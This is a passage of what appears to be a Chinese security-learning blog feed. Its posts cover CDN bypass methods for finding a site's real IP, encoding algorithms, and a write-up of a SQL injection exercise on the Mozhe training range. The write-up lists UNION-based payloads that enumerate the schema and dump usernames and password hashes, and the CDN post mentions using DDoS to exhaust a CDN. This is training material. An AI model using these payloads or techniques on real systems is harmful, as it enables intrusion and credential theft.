href="#3-操作系统层面漏洞类型" class="headerlink" title="3.操作系统层面漏洞类型"></a>3.操作系统层面漏洞类型</h2><ul><li>从漏洞攻击条件分类：远程，本地（远程执行，本地权限提升等） </li><li>从漏洞攻击对象分类：自带，三方（缓冲器溢出，IE漏洞，IIS漏洞等） </li><li>从漏洞影响危害分类：权限丢失，数据丢失，文件被操作，服务器被控制等 </li><li>从漏洞安全修复分类：已知漏洞，未知漏洞，已知攻击，未知攻击等</li><li>…</li></ul><h2 id="4-操作系统层面漏洞影响范围"><a href="#4-操作系统层面漏洞影响范围" class="headerlink" title="4.操作系统层面漏洞影响范围"></a>4.操作系统层面漏洞影响范围</h2><ul><li>获取权限</li><li>影响服务器运行</li><li>使服务器崩溃</li></ul>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>信息收集之CDN相关技术</title>
    <link href="/2022/07/14/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8BCDN%E7%9B%B8%E5%85%B3%E6%8A%80%E6%9C%AF/"/>
    <url>/2022/07/14/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8BCDN%E7%9B%B8%E5%85%B3%E6%8A%80%E6%9C%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="信息收集之CDN相关技术"><a href="#信息收集之CDN相关技术" class="headerlink" title="信息收集之CDN相关技术"></a>信息收集之CDN相关技术</h1><h4 id="1-什么是CDN"><a href="#1-什么是CDN" class="headerlink" title="1.什么是CDN"></a>1.什么是CDN</h4><p>&emsp;&emsp;CDN的全称是Content Delivery Network，即<a href="https://baike.baidu.com/item/%E5%86%85%E5%AE%B9%E5%88%86%E5%8F%91%E7%BD%91%E7%BB%9C/4034265">内容分发网络</a>。CDN是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。CDN的关键技术主要有内容存储和分发技术。但是在安全测试的过程中，若目标存在CDN服务，就会影响到后续的安全测试过程。</p><p><img src="/img/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8BCDN%E7%9B%B8%E5%85%B3%E6%8A%80%E6%9C%AF/1.jpg" alt="1"></p><h4 id="2-如何判断是否存在CDN"><a href="#2-如何判断是否存在CDN" class="headerlink" title="2.如何判断是否存在CDN"></a>2.如何判断是否存在CDN</h4><h5 id="emsp-方法一：使用超级ping网页工具"><a href="#emsp-方法一：使用超级ping网页工具" class="headerlink" title="&emsp;方法一：使用超级ping网页工具"></a>&emsp;方法一：使用超级ping网页工具</h5><p>&emsp;&emsp;原理：使用不同地区ping相同的服务器，看 ip是否一致。</p><p>&emsp;&emsp;（<a href="https://ping.chinaz.com/%EF%BC%89">https://ping.chinaz.com/）</a></p><ul><li><p>无CDN：<br>在ping的过程中，所有返回的IP地址都是相同的，这说明没有利用到CDN技术</p><p><img src="/img/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8BCDN%E7%9B%B8%E5%85%B3%E6%8A%80%E6%9C%AF/2.jpg"></p></li><li><p>有CDN</p><p>在ping的过程中，返回的IP地址是存在不同的，这说明用来多个储存服务器，也就利用到CDN技术</p><p><img src="/img/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8BCDN%E7%9B%B8%E5%85%B3%E6%8A%80%E6%9C%AF/3.jpg"></p></li></ul><h5 id="emsp-方法二：命令行查询"><a href="#emsp-方法二：命令行查询" class="headerlink" title="&emsp;方法二：命令行查询"></a>&emsp;方法二：命令行查询</h5><p>&emsp;&emsp;在window中使用cmd命令板的nslookup命令，可以查看目标是否有多个IP地址，如果有，则可能是使用了CDN服务。</p><p>&emsp;&emsp;nslookup：用于查询DNS的记录，查询域名解析是否正常，在网络故障时用来诊断网络问题。nslookup是一个程序的名字，这个程序让因特网服务器管理员或任何的计算机用户输入一个主机名（举例来说，“whatis.com.cn”）并发现相应的IP地址。它也会相反的名字查找为一个你指定的 IP 住址找出主机名。</p><p><img src="/img/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8BCDN%E7%9B%B8%E5%85%B3%E6%8A%80%E6%9C%AF/4.jpg"></p><p>&emsp;&emsp;讲道理，看到有些博客写的能分辨，但是在使用的过程中，我是一脸懵逼的，我感觉他并不完全准确，还不如用网页版的ping来判断，个人感觉不好用。</p><h4 id="3-常见的CDN绕过方法"><a href="#3-常见的CDN绕过方法" class="headerlink" title="3.常见的CDN绕过方法"></a>3.常见的CDN绕过方法</h4><h5 id="emsp-1）子域名查询"><a href="#emsp-1）子域名查询" class="headerlink" title="&emsp;1）子域名查询"></a>&emsp;1）子域名查询</h5><p>&emsp;&emsp;原理：其实CDN技术是需要花钱购买和维护的，所以除非大公司，一般的公司只会用CDN技术覆盖到访问量比较高的，但是不会对子站做CDN，所以我们可以通过子域名查询该网站的真实IP地址。（穷确实是好欺负）</p><p>&emsp;&emsp;（子域名查询网站：<a href="https://www.dnsgrep.cn/%EF%BC%89">https://www.dnsgrep.cn/）</a></p><p><img src="/img/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8BCDN%E7%9B%B8%E5%85%B3%E6%8A%80%E6%9C%AF/5.jpg"></p><p>&emsp;&emsp;查个thai.baidu.com,看来像百度一样的大公司也不不一定会全部覆盖呀。找不常用的子域名最好，这里thai.baidu.com后面还是有几个的，但是相对来说少了很多类型了。</p><p><img src="/img/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8BCDN%E7%9B%B8%E5%85%B3%E6%8A%80%E6%9C%AF/6.jpg"></p><h5 id="emsp-2）邮件服务查询"><a href="#emsp-2）邮件服务查询" class="headerlink" title="&emsp;2）邮件服务查询"></a>&emsp;2）邮件服务查询</h5><p>&emsp;&emsp;很多公司内部都会有一个自己用的邮箱服务器，由于邮箱服务器一般都是公司内部人去访问，所以大部分不做CDN。因此，我们就可以根据对方邮件服务器给我们发送的邮件，来判断对方的IP地址。</p><h5 id="emsp-3）国外地址查询"><a href="#emsp-3）国外地址查询" class="headerlink" title="&emsp;3）国外地址查询"></a>&emsp;3）国外地址查询</h5><p>&emsp;&emsp;原理其实和邮件服务查询差不多，有些公司面对的对象客户是国内，所以对国外的用户而言基本不会花钱给他们搞个CDN，所以我们可以尝试用从国外访问国内的网站就很可能直接访问的就是主站的真实ip地址。</p><p>&emsp;&emsp;（<a href="https://tools.ipip.net/cdn.php%EF%BC%89%E8%BF%99%E7%8E%A9%E6%84%8F%E8%A6%81%E6%B3%A8%E5%86%8C%EF%BC%8C%E6%88%91%E6%B2%A1%E8%AF%95%E8%BF%87%EF%BC%8C%E8%B0%A8%E6%85%8E%E4%B8%80%E5%AE%9A%E7%9A%84%E5%A5%BD%EF%BC%8C%E4%BD%86%E6%98%AF%E7%9C%8B%E4%BA%86%E5%87%A0%E4%B8%AA%E5%8D%9A%E4%B8%BB%E7%9A%84%E7%A1%AE%E5%AE%9E%E8%83%BD%E7%94%A8%E3%80%82">https://tools.ipip.net/cdn.php）这玩意要注册，我没试过，谨慎一定的好，但是看了几个博主的确实能用。</a></p><h5 id="emsp-4）遗留文件，扫描全网查询"><a href="#emsp-4）遗留文件，扫描全网查询" class="headerlink" title="&emsp;4）遗留文件，扫描全网查询"></a>&emsp;4）遗留文件，扫描全网查询</h5><p>&emsp;&emsp;遗留文件，例如phpinfo.php页面，找到遗留的ip地址。扫描全网，从各个地区访问网站，收集ip地址，再从中找出真实ip。</p><p>&emsp;&emsp;扫描工具：fuckcdn，zmap</p><h5 id="emsp-5）黑暗引擎搜索特定文件"><a href="#emsp-5）黑暗引擎搜索特定文件" class="headerlink" title="&emsp;5）黑暗引擎搜索特定文件"></a>&emsp;5）黑暗引擎搜索特定文件</h5><p>&emsp;&emsp;黑暗搜索引擎是一种工具，可让您在暗网上查找隐藏信息。暗网有许多不同类型的暗网搜索引擎，每个都有它的特色。例如，有些暗网搜索引擎的搜索能力比其他的好。有些可以专门搜索securedrop，而有些搜索引擎会找到有毒品或网络犯罪活动等非法内容的暗网网站。而其他的则更加普遍，几乎可以找到暗网的任何内容。（有风险，但是确实有效）</p><p>&emsp;&emsp;（<a href="https://www.shodan.io/%EF%BC%89">https://www.shodan.io/）</a></p><h5 id="emsp-6）DNS历史记录查询"><a href="#emsp-6）DNS历史记录查询" class="headerlink" title="&emsp;6）DNS历史记录查询"></a>&emsp;6）DNS历史记录查询</h5><p>&emsp;&emsp;站点在使用CDN服务前，真实的ip地址可能会被DNS记录，所以我们可以通过查看CDN历史找到目标真实的ip</p><p>&emsp;&emsp;（<a href="https://dnsdb.io/zh-cn/%EF%BC%89">https://dnsdb.io/zh-cn/）</a></p><p><img src="/img/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8BCDN%E7%9B%B8%E5%85%B3%E6%8A%80%E6%9C%AF/7.jpg"></p><h5 id="emsp-7）DDOS攻击查询"><a href="#emsp-7）DDOS攻击查询" class="headerlink" title="&emsp;7）DDOS攻击查询"></a>&emsp;7）DDOS攻击查询</h5><p>&emsp;&emsp;这个很好理解，其实每一个CDN的流量都存在上限的，假设他能承载100个人访问，我们使用DDOS伪造一万个人去访问，由于CDN的流量限制，耗费完了之后，就是真实ip地址</p><p>&emsp;&emsp;讲道理，除非是公司允许，别轻易使用，兄弟，要吃牢饭滴！！！</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>等保暂更</title>
    <link href="/2022/07/13/%E7%AD%89%E4%BF%9D%E6%9A%82%E6%9B%B4/"/>
    <url>/2022/07/13/%E7%AD%89%E4%BF%9D%E6%9A%82%E6%9B%B4/</url>
    
    <content type="html"><![CDATA[<h1 id="等保暂更"><a href="#等保暂更" class="headerlink" title="等保暂更"></a>等保暂更</h1><p>&emsp;&emsp;等保文字内容比较多，现在还没太多时间更新（要看的东西太多了，又不像技术层面，要整理太耗费时间了），主要研究方向还是web安全的渗透部分，等以后有可以时间再更吧，一定会更的，不更是小狗（汪汪汪）！</p><center><img src="/img/%E7%AD%89%E4%BF%9D%E6%9A%82%E6%9B%B4/1.png" style="zoom: 150%;" /></center>]]></content>
    
    
    <categories>
      
      <category>等级保护</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>安全物理换机测评要求及方法</title>
    <link href="/2022/07/12/%E5%AE%89%E5%85%A8%E7%89%A9%E7%90%86%E6%8D%A2%E6%9C%BA%E6%B5%8B%E8%AF%84%E8%A6%81%E6%B1%82%E5%8F%8A%E6%96%B9%E6%B3%95/"/>
    <url>/2022/07/12/%E5%AE%89%E5%85%A8%E7%89%A9%E7%90%86%E6%8D%A2%E6%9C%BA%E6%B5%8B%E8%AF%84%E8%A6%81%E6%B1%82%E5%8F%8A%E6%96%B9%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h1 id="安全物理换机测评要求及方法"><a href="#安全物理换机测评要求及方法" class="headerlink" title="安全物理换机测评要求及方法"></a>安全物理换机测评要求及方法</h1><p><strong>注：参考网址为<a href="https://www.cnblogs.com/quqibinggan/p/15607271.html#:~:text=%E4%BF%9D%E9%9A%9C%E7%AD%89%E7%BA%A7%E4%BF%9D%E6%8A%A4%E5%AF%B9%E8%B1%A1,%E6%89%80%E6%9C%89%E5%AE%89%E5%85%A8%E7%9A%84%E5%9F%BA%E7%A1%80%E3%80%82">https://www.cnblogs.com/quqibinggan/p/15607271.html</a></strong></p><h2 id="1-保护对象"><a href="#1-保护对象" class="headerlink" title="1.保护对象"></a>1.保护对象</h2><p>​        &emsp;&emsp;等级保护对象是由计算机或其他信息终端及相关设备组成的按照一定的规则和程序对信息进行收集、存储、传输、交换、处理的系统。主要包括基础信息网络、云计算平台/系统、大数据应用/平台/资源、物联网、工业控制系统和采用移动互联网技术的系统等。</p><p>​        &emsp;&emsp;保障等级保护对象设备保护对象设备的物理安全，包括防止设备被破坏，被盗用，保障物理环境的条件，确保设备正常运行，减少技术故障等等，是所有安全的基础。通常等级保护对象的相关设备均集中存放在机房中，通过其他物理辅助设施（如门禁，空调等）保障他们的安全。</p><h2 id="2-物理安全"><a href="#2-物理安全" class="headerlink" title="2.物理安全"></a>2.物理安全</h2><p>​        &emsp;&emsp;安全物理环境针对物理机房提出了安全控制要求，主要对象为物理环境，物理设备和物理设施等；涉及的安全控制点包括：</p><p><img src="/img/%E5%AE%89%E5%85%A8%E7%89%A9%E7%90%86%E6%8D%A2%E6%9C%BA%E6%B5%8B%E8%AF%84%E8%A6%81%E6%B1%82%E5%8F%8A%E6%96%B9%E6%B3%95/1.png"></p>]]></content>
    
    
    <categories>
      
      <category>等级保护</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>web前言</title>
    <link href="/2022/07/11/web%E5%89%8D%E8%A8%80/"/>
    <url>/2022/07/11/web%E5%89%8D%E8%A8%80/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>&emsp;&emsp;在之前所提到的中间件，网站源码等问题以外，攻击者还能够利用操作系统、数据库等不同的模板进行对应的攻击操作。</p><p><img src="/img/web%E5%89%8D%E8%A8%80/1.png"></p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>夕阳</title>
    <link href="/2022/07/11/%E5%A4%95%E9%98%B3/"/>
    <url>/2022/07/11/%E5%A4%95%E9%98%B3/</url>
    
    <content type="html"><![CDATA[<h1 id="夕阳"><a href="#夕阳" class="headerlink" title="夕阳"></a>夕阳</h1><p>&emsp;&emsp;跑完步后浅拍下五所的夕阳，确实是个养老的好地方。在夕阳下，两个人坐在太师椅上，也不说话，就摇啊摇，多是一件美事啊</p><p><img src="/img/%E5%A4%95%E9%98%B3/0.jpg"></p><p><img src="/img/%E5%A4%95%E9%98%B3/1.jpg"></p><p><img src="/img/%E5%A4%95%E9%98%B3/2.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>日记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>加密编码渗透演示（sql注入类型）</title>
    <link href="/2022/07/11/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E6%B8%97%E9%80%8F%E6%BC%94%E7%A4%BA%EF%BC%88sql%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%EF%BC%89/"/>
    <url>/2022/07/11/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E6%B8%97%E9%80%8F%E6%BC%94%E7%A4%BA%EF%BC%88sql%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="加密编码渗透演示（sql注入类型）"><a href="#加密编码渗透演示（sql注入类型）" class="headerlink" title="加密编码渗透演示（sql注入类型）"></a>加密编码渗透演示（sql注入类型）</h1><h4 id="1-打开题目"><a href="#1-打开题目" class="headerlink" title="1.打开题目"></a>1.打开题目</h4><p>&emsp;&emsp;这里使用的是墨者学院的靶场（<a href="https://www.mozhe.cn/%EF%BC%89">https://www.mozhe.cn/）</a></p><p>&emsp;&emsp;啥都好，就是要金币，太不友好了，不给白嫖！！！！</p><p><img src="/img/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E6%B8%97%E9%80%8F%E6%BC%94%E7%A4%BA%EF%BC%88sql%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%EF%BC%89/1.jpg"></p><h4 id="2-进入网页"><a href="#2-进入网页" class="headerlink" title="2.进入网页"></a>2.进入网页</h4><p><img src="/img/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E6%B8%97%E9%80%8F%E6%BC%94%E7%A4%BA%EF%BC%88sql%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%EF%BC%89/2.jpg"></p><h4 id="3-查找切入点"><a href="#3-查找切入点" class="headerlink" title="3.查找切入点"></a>3.查找切入点</h4><p>&emsp;&emsp;表面没啥，但是注意到下面有个维护通知，点开看看</p><p><img src="/img/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E6%B8%97%E9%80%8F%E6%BC%94%E7%A4%BA%EF%BC%88sql%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%EF%BC%89/2.5.jpg" alt="2.5"></p><p>&emsp;&emsp;可以看见为new/php格式，我们尝试退回到new看看有没有发现</p><p><img src="/img/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E6%B8%97%E9%80%8F%E6%BC%94%E7%A4%BA%EF%BC%88sql%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%EF%BC%89/3.jpg"></p><p>&emsp;&emsp;哦吼，一回退发现了list.zip，解压后是个php文件，这就打开</p><h4 id="4-解读代码"><a href="#4-解读代码" class="headerlink" title="4.解读代码"></a>4.解读代码</h4><p>&emsp;&emsp;看见代码是解密的流程，根据提示，我们可以一步步实现解密</p><p><img src="/img/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E6%B8%97%E9%80%8F%E6%BC%94%E7%A4%BA%EF%BC%88sql%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%EF%BC%89/4.jpg"></p><p>&emsp;&emsp;最后是base64加密</p><p><img src="/img/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E6%B8%97%E9%80%8F%E6%BC%94%E7%A4%BA%EF%BC%88sql%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%EF%BC%89/5.jpg"></p><p>&emsp;&emsp;在base64加密前是用AES的加密方式，相关参数也给出了，也就是说我们需要将</p><p><img src="/img/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E6%B8%97%E9%80%8F%E6%BC%94%E7%A4%BA%EF%BC%88sql%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%EF%BC%89/2.5.jpg" alt="2.5"></p><p>&emsp;&emsp;框住的字符串进行回退查看内容！</p><h4 id="5-解密操作"><a href="#5-解密操作" class="headerlink" title="5.解密操作"></a>5.解密操作</h4><p>&emsp;&emsp;先是base64解密</p><p><img src="/img/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E6%B8%97%E9%80%8F%E6%BC%94%E7%A4%BA%EF%BC%88sql%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%EF%BC%89/6.jpg"></p><p>&emsp;&emsp;然后是AES解密：</p><p><img src="/img/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E6%B8%97%E9%80%8F%E6%BC%94%E7%A4%BA%EF%BC%88sql%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%EF%BC%89/8-16591901433491.jpg"></p><p>&emsp;&emsp;我们再次阅读代码，发现他规定最后是带有_mozhe的形式，因此我们在实现sql注入时要注意这一点</p><h4 id="6-开始注入"><a href="#6-开始注入" class="headerlink" title="6.开始注入"></a>6.开始注入</h4><h6 id="①数据库查询："><a href="#①数据库查询：" class="headerlink" title="①数据库查询："></a>①数据库查询：</h6><ul><li><p>payload： -1 union select 1,database(),3,4_mozhe</p></li><li><p>url: </p><p>eGdkNThpcFRybng4VnpTQkppY3FDa2ZhOGJhWTFnQy9yYm9uL2JvZVdSdGM1eUdzNk5KUi91d1RDL1I2MWRYSQ==</p></li><li><p>得到数据库名: mozhe_Discuz_StormGroup</p></li></ul><p><img src="/img/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E6%B8%97%E9%80%8F%E6%BC%94%E7%A4%BA%EF%BC%88sql%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%EF%BC%89/9.jpg"></p><h6 id="②数据库中的表查询："><a href="#②数据库中的表查询：" class="headerlink" title="②数据库中的表查询："></a>②数据库中的表查询：</h6><ul><li>payload： -1 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=“mozhe_Discuz_StormGroup”_mozhe</li><li>url: eGdkNThpcFRybng4VnpTQkppY3FDdG54VWtMbVR5VEJBa1lxMFlvdEIrMlRVbHhpYVpIeitwRlhKSkFqazd3N21XYTFoOGJ1V1ZtMUwxRm56SkJ5VVU3S0FYeGFIbDkyd0xBS1VyR2FiekxGaExqT0tWR3d4cFpWV1dqaHRSOVdqazFyV1Nnb3JPOWJNeXk3UnhEREVhckhTcFpxbTZSNSt4dFBBRmJ1QXhnZHdDZkMvT0VVdGFmK2ZlTjRSc0xq</li><li>得到表名： StormGroup_member,notice</li></ul><p><img src="/img/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E6%B8%97%E9%80%8F%E6%BC%94%E7%A4%BA%EF%BC%88sql%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%EF%BC%89/10.jpg"></p><h6 id="③字段名查询："><a href="#③字段名查询：" class="headerlink" title="③字段名查询："></a>③字段名查询：</h6><ul><li>payload： -1 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=“StormGroup_member”_mozhe</li><li>url: eGdkNThpcFRybng4VnpTQkppY3FDdXZ6d1EwNGthL1B1YkJOa0tKeUpFVFV3L3phV0d6QUtiajhvTTFSUWJoV0JaYXRCVWt1WWUreiswdDhJbnpLUXg2N2xuMHJMb2hJM0NWVWtrWlZuRGs3VGVUUHgwS1Y1VDg1ZFVxdy9ZcUN0M3lITk8rTVorRlppNTZBTExqSjdMMU45bTl4alVCUzg5ZFhERVRBSVZNPQ==</li><li>得到各字段名： id,name,password,status</li></ul><p><img src="/img/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E6%B8%97%E9%80%8F%E6%BC%94%E7%A4%BA%EF%BC%88sql%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%EF%BC%89/11.jpg"></p><h6 id="④字段内容查询："><a href="#④字段内容查询：" class="headerlink" title="④字段内容查询："></a>④字段内容查询：</h6><ul><li><p>payload： -1 union select 1,group_concat(name,%3a,password),3,4 from StormGroup_member_mozhe</p></li><li><p>url:</p><p>id=eGdkNThpcFRybng4VnpTQkppY3FDcktrNkQ2cFlZbEZQUFFiOWpHYlZrVDZTcTM0MWRVQStqQWVoeUFzRkdFTWtkR0VCeCt0Y1NkMDFHeFI3MW9RSWNlTlNGOUxpMnRudHRpc3g3cGhmRkk9</p></li></ul><p><img src="/img/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E6%B8%97%E9%80%8F%E6%BC%94%E7%A4%BA%EF%BC%88sql%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%EF%BC%89/12.jpg"></p><h6 id="⑤MD5解密："><a href="#⑤MD5解密：" class="headerlink" title="⑤MD5解密："></a>⑤MD5解密：</h6><p><img src="/img/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E6%B8%97%E9%80%8F%E6%BC%94%E7%A4%BA%EF%BC%88sql%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%EF%BC%89/13.jpg"></p><p><img src="/img/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E6%B8%97%E9%80%8F%E6%BC%94%E7%A4%BA%EF%BC%88sql%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%EF%BC%89/14.jpg"></p><h6 id="⑥登录成功："><a href="#⑥登录成功：" class="headerlink" title="⑥登录成功："></a>⑥登录成功：</h6><p><img src="/img/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E6%B8%97%E9%80%8F%E6%BC%94%E7%A4%BA%EF%BC%88sql%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%EF%BC%89/15.jpg"></p><p>&emsp;&emsp;（这解密真累人！！！！！！）</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>加密编码算法</title>
    <link href="/2022/07/10/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95/"/>
    <url>/2022/07/10/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h1 id="加密编码算法"><a href="#加密编码算法" class="headerlink" title="加密编码算法"></a>加密编码算法</h1><h4 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h4><p>&emsp;&emsp;在渗透测试中，一般的敏感信息都会采用加密编码的方式进行处理，所以需要我们了解到常用的一些加密方式。加密解密可以通过第三方平台、工具软件、自己代码编写等方式进行。</p><p>&emsp;&emsp;参考加解密网站：</p><ul><li><a href="https://www.sojson.com/encrypt/">https://www.sojson.com/encrypt/</a></li><li><a href="http://tool.chacuo.net/cryptaes">http://tool.chacuo.net/cryptaes</a></li></ul><p><img src="/img/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95/0.jpg"></p><h4 id="2-常见加密编码解析"><a href="#2-常见加密编码解析" class="headerlink" title="2.常见加密编码解析"></a>2.常见加密编码解析</h4><h5 id="emsp-emsp-MD5："><a href="#emsp-emsp-MD5：" class="headerlink" title="&emsp;&emsp;MD5："></a>&emsp;&emsp;MD5：</h5><p>&emsp;&emsp;（<a href="https://www.sojson.com/encrypt_md5.html%EF%BC%89">https://www.sojson.com/encrypt_md5.html）</a></p><p>&emsp;&emsp;MD5是不可逆的加密方式，分为16位和32位，加密密文字符串由A-Z,0-9随机分配，80%-90%网站管理员或用户密码加采取MD5加密。</p><p><img src="/img/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95/1.jpg"></p><p>&emsp;&emsp;值得一提的是MD5具有解密，但是解密形式的本质其实是通过枚举的办法，所以这也导致了解密的困难性（不可逆不代表不能解密）</p><p><img src="/img/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95/2.jpg"></p><h5 id="emsp-emsp-SHA："><a href="#emsp-emsp-SHA：" class="headerlink" title="&emsp;&emsp;SHA："></a>&emsp;&emsp;SHA：</h5><p>&emsp;&emsp;（<a href="https://www.mklab.cn/utils/sha%EF%BC%89">https://www.mklab.cn/utils/sha）</a></p><p>&emsp;&emsp;SHA同样是不可逆的加密方式，由A-Z，0-9随机组合，SHA1，SHA256，SHA384，SHA512长度固定</p><p><img src="/img/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95/3.jpg"></p><p>&emsp;&emsp;不同的编码格式，所对应的加密长度是不相同的</p><h5 id="emsp-emsp-ASC："><a href="#emsp-emsp-ASC：" class="headerlink" title="&emsp;&emsp;ASC："></a>&emsp;&emsp;ASC：</h5><p>&emsp;&emsp;（<a href="https://www.matools.com/code-convert-ascii%EF%BC%89">https://www.matools.com/code-convert-ascii）</a></p><p><img src="/img/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95/4.jpg"></p><h5 id="emsp-emsp-进制"><a href="#emsp-emsp-进制" class="headerlink" title="&emsp;&emsp;进制:"></a>&emsp;&emsp;进制:</h5><p>&emsp;&emsp;(<a href="https://www.sojson.com/hexconvert.html">https://www.sojson.com/hexconvert.html</a>)</p><p>&emsp;&emsp;数学上的进制转换，基本不会使用（毕竟用的太low了）</p><h5 id="emsp-emsp-时间戳："><a href="#emsp-emsp-时间戳：" class="headerlink" title="&emsp;&emsp;时间戳："></a>&emsp;&emsp;时间戳：</h5><p>&emsp;&emsp;（<a href="https://shijianchuo.net/%EF%BC%89">https://shijianchuo.net/）</a></p><p>&emsp;&emsp;网站或者服务器经常会使用到的加密方式，以及数据库里用户登录和注销等。采用的不是常规的时间格式，而是特定的数字串。</p><p><img src="/img/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95/5.jpg"></p><h5 id="emsp-emsp-URL："><a href="#emsp-emsp-URL：" class="headerlink" title="&emsp;&emsp;URL："></a>&emsp;&emsp;URL：</h5><p>&emsp;&emsp;（<a href="https://www.sojson.com/encodeurl.html%EF%BC%89">https://www.sojson.com/encodeurl.html）</a></p><p>&emsp;&emsp;url编码加密就是将播放地址自定义算法编码，创建私有协议的播放地址。 播放需要专用的播放器进行地址解码。 浏览器只做一次加密，在渗透绕过的时候可能会使用二次，三次加密方式。</p><p><img src="/img/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95/6.jpg"></p><h5 id="emsp-emsp-BASE64："><a href="#emsp-emsp-BASE64：" class="headerlink" title="&emsp;&emsp;BASE64："></a>&emsp;&emsp;BASE64：</h5><p>&emsp;&emsp;（<a href="https://www.sojson.com/base64.html%EF%BC%89">https://www.sojson.com/base64.html）</a></p><p>&emsp;&emsp;Base64是一种直接利用64位可打印字符来表示二进制数据的编码算法。大小写随机组合，在字符串后面经常出现一个或两个等号；明文越长，密文越长。常见应用与代码、密码、参数。</p><p>&emsp;&emsp;加密例子：大葱蘸酱最牛逼</p><p><img src="/img/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95/7.jpg"></p><h5 id="emsp-emsp-Unescape："><a href="#emsp-emsp-Unescape：" class="headerlink" title="&emsp;&emsp;Unescape："></a>&emsp;&emsp;Unescape：</h5><p>&emsp;&emsp;（<a href="http://web.chacuo.net/charsetescape%EF%BC%89">http://web.chacuo.net/charsetescape）</a></p><p>&emsp;&emsp;Escape编码/加密,就是字符对应UTF-16 16进制表示方式前面加%u。 Unescape解码/解密 